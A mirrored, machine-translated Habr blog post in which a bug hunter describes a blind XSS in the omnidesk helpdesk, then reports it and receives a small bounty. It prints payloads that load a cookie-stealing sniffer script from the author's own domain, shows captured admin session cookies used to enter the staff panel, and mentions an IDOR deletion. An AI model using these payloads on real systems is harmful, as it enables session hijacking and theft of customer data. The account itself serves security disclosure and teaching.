<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>[Bughunting] Blind XSS vulnerability on omnidesk support sites</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Background: This story begins with the fact that in many public posts to which I subscribed I saw sowing (advertising in social networks) groups with ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>[Bughunting] Blind XSS vulnerability on omnidesk support sites</h1><div class="post__text post__text-html js-mediator-article">  <b>Background:</b> This story begins with the fact that in many public posts to which I subscribed I saw sowing (advertising in social networks) groups with free keys vk.com/ <b>*******</b> and vk.com/ <b>**** *</b> .  These crops are expensive, made in groups of 250,000 to 5,000,000 subscribers, for example, in the <b>Science and Technology</b> group.  Groups offered everyone a free subscription key.  After about half a month I saw that the first group had grown to <b>109 thousand subscribers</b> .  Here, it is clear to anyone that people will not receive a free key, because you will not ‚Äúsave enough‚Äù free keys for 100 people.  After a little inspection of the group, I realized that the "real" reviews about getting free keys are fake, because screenshots from reviews all the time throw the same and links to people are fake. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/03c/9cf/d2c/03c9cfd2c3e74bcfa21ce608841eaf4d.png"></div><br><div style="text-align:center;"><img src="https://habrastorage.org/files/09c/5ea/a37/09c5eaa37f184c16b7fe4181272af8d7.png"></div><br>  The most interesting thing is that people are still conducting all of this, join the group in the hope of a free key, make a repost in the hope that they will be lucky and they will win an expensive gaming PC ( <s>but we know that no one will get a PC</s> ) when they want to get something for free, they are easy to manipulate for their own purposes. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/files/dc6/4e0/cf0/dc64e0cf04dc4981ada0dfb64949e5b5.png"></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The whole essence of the posts in the group is advertising the referral link to the <b>*** random.ru website</b> and getting benefits. <br><br><img src="https://habrastorage.org/files/6ac/f4f/f5f/6acf4ff5f3a441a0ba9719b831cf8abe.jpg"><br><br>  Let's look at it. <br><a name="habracut"></a><br>  It has been written that the site is over three years old, although the *** random.ru domain is registered on 2016.10.07. <br><br>  Click on "I want to make money", we see the message: <br><blockquote>  Do you have a public and you want to earn on it?  Get the link and drain the traffic, getting 75% from each sold key.  We consider publics from 5000 subscribers. </blockquote><br>  <b>Mathematics:</b> Let's say, out of 100,000 subscribers, 10% bought a key for 100 rubles, then the creators of the public will receive: 10,000 * 100 = 1,000,000-250,000 (25%) = <u><b>750 thousand rubles</b></u> .  Good earnings, probably, they will pay well for the vulnerability found on their service. <br><br>  For sites <b>***** - keys.ru</b> and <b>*** random.ru</b> general support service.  We test the support service by url <a href="http://support.gamedelivery.info/">support.gamedelivery.info</a> .  There is a personal account functionality, there are no vulnerabilities found in the search for tickets, too.  Hope only to send a request to the JMP. <br><br>  We test for blind xss-vulnerability - we send the administrator the address with the name and body: <br><br><pre><code class="php hljs">\<span class="hljs-string"><span class="hljs-string">"--&gt;&lt;/script&gt;"</span></span>&gt;&lt;script src=https:<span class="hljs-comment"><span class="hljs-comment">//securityz.net/test_for_habr.js</span><span class="hljs-meta"><span class="hljs-comment"><span class="hljs-meta">?&gt;</span></span></span><span class="hljs-comment">&lt;meta http-equiv="refresh" content="1;URL=https://securityz.net?gamedelivery" /&gt;</span></span></code> </pre> <br>  We sent the admin js upload with our sniffer and redirect to our site.  Look logs: <br><br><blockquote>  ** 3.9 * .56.123 - - [18 / Feb / 2017: 01: 14: 10 +0300] ‚ÄúGET / gamedelivery HTTP / 1.1‚Äù 200 391686 "-" "Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.36 ( KHTML, like Gecko) Chrome / 32.0.1700.2 Safari / 537.36 " </blockquote><br>  Logs on the sniffer did not come, then user support is a filter on the script.  BUT &lt;meta http-equiv = "refresh" worked, it means xss is. <br><br>  We are trying to load our sniffer script in another way: like onerror in img: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> scrit =document.reatElment(<span class="hljs-string"><span class="hljs-string">'script'</span></span>);script.src =<span class="hljs-string"><span class="hljs-string">'//securityz.net/test_for_habr.js'</span></span>; documnt.body.appendChild(script);</code> </pre> <br>  We are waiting for the admin to log in with a js-script and give us all your cookies, a screenshot of the page and all the html-code of the page. <br><br>  The script ran on / staff / cases / list / filter / open, cookies came to me. <br><br><pre> <code class="hljs go">PHPSESSID=<span class="hljs-number"><span class="hljs-number">4182s</span></span>sjqfae0fl73f7lqkgdcb8; ajs_anonymous_id=%<span class="hljs-number"><span class="hljs-number">22</span></span>c8582a35-f81b<span class="hljs-number"><span class="hljs-number">-43</span></span>bd<span class="hljs-number"><span class="hljs-number">-8223</span></span>-e0c7c43bc53a%<span class="hljs-number"><span class="hljs-number">22</span></span>; _hjIncludedInSample=<span class="hljs-number"><span class="hljs-number">1</span></span>; _cioid=client<span class="hljs-number"><span class="hljs-number">-2990</span></span>; _cio=<span class="hljs-number"><span class="hljs-number">54</span></span>bdeef1<span class="hljs-number"><span class="hljs-number">-058</span></span>c<span class="hljs-number"><span class="hljs-number">-8f</span></span>11<span class="hljs-number"><span class="hljs-number">-47f</span></span>e<span class="hljs-number"><span class="hljs-number">-26d</span></span>4f538fcf7; ajs_user_id=null; ajs_group_id=null</code> </pre> <br>  And the screenshot: <br><br><img src="https://habrastorage.org/files/b24/6b8/407/b246b8407f0348bb81cbe009d7aeb235.png"><br>  Kukam was not happy, because I often come across <b>httponly</b> , it can be the same here. <br><br>  I substitute cookies and I find myself in the employee panel. <br><br><img src="https://habrastorage.org/files/54d/6a4/5d1/54d6a45d12194e77976a91dbc7960ab1.png"><br><br>  I'm trying to change the password on the account, but for this I need the current password.  I cannot add a new employee, because this account does not have enough rights. <br><br><img src="https://habrastorage.org/files/2cf/31c/f73/2cf31cf735b544e588523faee298c3ee.png"><br><br>  We can see all calls (there are only 10 thousand) and all users.  Many users in appeals are not satisfied with the service, the wrong key came, the key was already used, the key did not come, the wrong game came, which I wanted (well, the user himself is to blame, it‚Äôs written that random game).  We can also download all the data with one click. <br><br>  There are only 18 thousand users, we can download this information: Username, email, links to his social network - facebook, vk, googlePlus, skype, viber.  We can also edit information about any user, manage any ticket, write to arbitrary email addresses on behalf of support@support.gamedelivery.info (send emails to all email addresses from the database phishing emails / link to the competitor‚Äôs site /) and edit any article from the database knowledge.  And not just edit, but you can also write there any js script, and it will be executed in any user. <br><br>  Once discovered a vulnerability, immediately reported this in the feedback.  While waiting for an answer, my friend told me that this support service is the omnidesk.ru project.  They provide such companies with many companies.  This means that with the help of blind xss it would be possible to hack all omnidesk clients.  In open access, they do not have. <br><br>  But an attacker would have been in my place, he would have hacked an employee at support.omnidesk.ru, leaked a list of all the companies, and attacked them. <br><br>  Or you can go the other way.  We find out that <a href="http://support.gamedelivery.info/">http://support.gamedelivery.info/</a> has a mirror on omnidesque <a href="https://gamedelivery.omnidesk.ru/">https://gamedelivery.omnidesk.ru/</a> , which means that other companies too! <br><br>  We use google site site: *. Omnidesk.ru and find 2050 companies!  This is quite a lot.  But these are not all companies, there are actually more of them, because not all companies use the canonical name * .omnidesk.ru.  gamedelivery.omnidesk.ru, for example, in search engines, no, it does not shine anywhere.  The only option is to look at the ip subgrid.  If this vulnerability fell into the hands of intruders, there would be a huge data sink.  Sites with the most alexarank (in Russia): <br><br>  <a href="https://ponominalu.ru/">https://ponominalu.ru/</a> - 2113 <br>  <a href="https://e-pay.tv/">https://e-pay.tv</a> - 4000 <br>  <a href="http://autozs.ru/">http://autozs.ru/</a> - 4200 <br>  <a href="https://fotobiz.pro/">https://fotobiz.pro/</a> - 13000 <br>  <a href="https://super-ego.info/">https://super-ego.info/</a> - 14000 <br>  <a href="https://kb.onlinepbx.ru/">https://kb.onlinepbx.ru</a> - 18000 <br><br>  + There is a demo term for using the service - 14 days, and then you have to pay.  So, omnidesk also earns good money. <br><br>  The answer came from *** random.ru that the vulnerability and overflow of their database is not their problem, but omnidesk.  We write omnidesk.  The executive first offers 1000 p ($ 16) for information about this xss. <br><br>  We write that this vulnerability is critical and ask to slightly increase the amount of remuneration. <br><br>  Answer: I can offer 3000 rubles. <br><br>  We cannot pay for such a lot.  First, we are not as rich as you would expect.  Secondly, you first reported the vulnerability to the client, and only then to us.  Thirdly, you already have customer data.  That is, everything happened that we would like to avoid.  The very same vulnerability fixed. <br><br>  So: <br><br>  <b>February 15 at 14.24:</b> Logs came. <br>  <b>February 15 at 15.33:</b> We write to the owner of the support service. <br>  <b>February 16 at 1.13:</b> The award of 3000 p. <br>  <b>February 17:</b> Helping developers with security. <br>  <b>February 20:</b> Developers fix other vulnerabilities. <br><br>  XSS on omnidesk, video: <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/WNx-fAYq1z0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><br>  The omnidesk site is very good, it‚Äôs bad that they treat their security this way.  Now, I think they understood that security in the project should be put in the first place.  I really hope that this article will not affect their reputation. <br><br>  Many companies can point to a ‚Äúhole‚Äù in safety, they will understand that the hole needs to be closed, and some just do not care about the security of their site, they think ‚ÄúIt works, well, let it work, let's not touch it.‚Äù  Example - CEO company from Odessa <b><a href="https://serpstat.com/ru/">serpstat.com</a></b> ( <b>alexarank 10,000</b> in Russia), the only way to contact the developers is to write to the chat.  Here is the dialogue: <br><br>  I: Found XSS vulnerability, where can I go? <br>  Evgeny: Vulnerability in our service? <br>  I: Yes, on yours. <br>  Eugene: We are invulnerable, as the main character in Die Hard-3. <br>  I: I found iDOR, I can delete any project on the site, give a number. <br>  Eugene: No problem, 85987. <br>  (further the operator will pretend that I have not deleted his project: D, although I was able to delete the project on the second test account). <br>  Me: Good afternoon, discovered the XSS vulnerability on your site <a href="https://www.openbugbounty.org/incidents/213614/">https://www.openbugbounty.org/incidents/213614/</a> . <br>  Eugene: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/786/73d/616/78673d6160747c086e6fdf5415321ca6.gif" alt="image"><br><br>  I: Do you need her, send details? <br>  Eugene: Thank you, keep it for yourself. <br>  Me: it feels like you don't give a damn about site security. <br>  Evgeniy: Rather, there is no desire to follow any links that you write in the chat <br>  (most likely, the link to openbugbounty scared the operator) <br><br>  Screenshot of the chat: <br><br><img src="https://habrastorage.org/files/dd6/be7/18e/dd6be718e6b04de2848e323edbfbd19e.jpg"><br><br>  By the way, from this you can make a good meme: D <br><br><img src="https://habrastorage.org/files/282/dd8/55f/282dd855f56e442198a77b3ef9db0c2b.jpg"><br><br>  <b>Conclusion from this article:</b> In the administrative panel you need to put cookies on <b>HttpOnly</b> .  serpstat.com - does not care about their security at all, it‚Äôs better not to trust their data. <br><br>  <b>Next article:</b> <a href="https://securityz.net/free_pizza/">[Free Pizza] Hacking a pizza delivery site, hacking mobidel.ru</a> <br><br>  <b>Previous article:</b> <a href="https://securityz.net/vuln_vk/">[BugBounty] Partial authentication bypass vk.com</a> . <br><br>  <b>PS:</b> I ask to subscribe to <b>vk</b> and <b>twitter</b> (link below in contacts), there I will upload information about new articles. <br><br>  The administration of Habrakhabra has prohibited the addition of links in the article to ‚Äúmalicious groups and sites‚Äù and the names of these groups in the screenshots. </div><p>Source: <a href="https://habr.com/ru/post/322134/">https://habr.com/ru/post/322134/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../322112/index.html">SDS, Cloudless Cloud, Aruba, and Composable Infrastructure: New HPE Webinars</a></li>
<li><a href="../322116/index.html">Problems encountered in the development of android-applications</a></li>
<li><a href="../322120/index.html">A tale about how I treated a server with WP, or 700 users online on 2 cores</a></li>
<li><a href="../322130/index.html">Testing the Documented API with the Apiary Dredd Utility</a></li>
<li><a href="../322132/index.html">Detailed introduction to rvalue links for those who lacked a short</a></li>
<li><a href="../322138/index.html">The worst technological forecasts for the last 150 years</a></li>
<li><a href="../322140/index.html">Graphic description of ownership and borrowing in Rust</a></li>
<li><a href="../322142/index.html">MySQL dacherization in Uber</a></li>
<li><a href="../322144/index.html">How to save the project from closing, having understood with MySQL</a></li>
<li><a href="../322146/index.html">Introducing 3CX V15 SP5 Beta and New Subscription Annual Licenses</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>